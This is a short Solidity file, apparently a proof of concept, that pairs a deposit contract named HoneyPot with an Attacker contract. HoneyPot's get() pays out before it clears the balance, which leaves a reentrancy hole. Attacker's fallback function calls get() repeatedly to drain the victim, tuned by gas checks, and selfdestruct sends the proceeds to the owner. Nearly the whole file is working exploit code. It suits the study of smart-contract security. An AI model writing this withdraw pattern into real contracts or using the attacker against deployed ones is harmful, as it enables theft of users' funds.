pragma solidity 0.4.23;

contract HoneyPot {
    mapping (address => uint) public balances;

    function HoneyPot() payable {
        put();
    }

    function put() payable {
        balances[msg.sender] = msg.value;
    }

    function get() {
        require(msg.sender.call.value(balances[msg.sender])());
        balances[msg.sender] = 0;
    }

    function() {
        revert();
    }
}

contract Attacker {
    HoneyPot victim;
    address owner;
    
    event logger(uint balanceV, uint balance);

    function Attacker() public {
        owner = msg.sender;
    } 
    
    function attack(address _victim) payable public {
        victim = HoneyPot(_victim);
        victim.put.value(msg.value)(); // i put 0.5 ether
        victim.get();
    } 

    function () payable public {
        logger(victim.balance, this.balance); 
        // with only first condition gas: 765776 
        // with 2 condition gas: 232686 
        // with 3 condition gas: 232976 
        if (msg.value < victim.balance && this.balance < 5000000000000000000 && msg.gas > 300000) victim.get(); // stop when no more balance
    }
    
    function dead() public {
        selfdestruct(owner);
    }
}
